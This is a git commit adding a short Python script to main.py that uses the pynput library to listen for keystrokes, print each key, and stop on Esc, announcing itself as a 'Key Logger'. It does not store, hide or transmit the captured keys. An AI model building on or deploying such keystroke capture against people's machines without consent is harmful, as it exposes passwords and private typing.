742649801de6ee559c4ba058a62050b826ad1481
Jack Yellan <jackyellan@gmail.com>
2025-08-18 22:10:15 -0400

    Update main.py

--- main.py
+++ main.py
@@ -1,2 +1,18 @@
 import pynput
 from pynput.keyboard import Key, Listener
+
+def on_press(key):
+    print(key)
+
+def on_release(key):
+    if key == Key.esc:
+        print("Ending Key Logger")
+        return False
+    
+
+
+
+
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
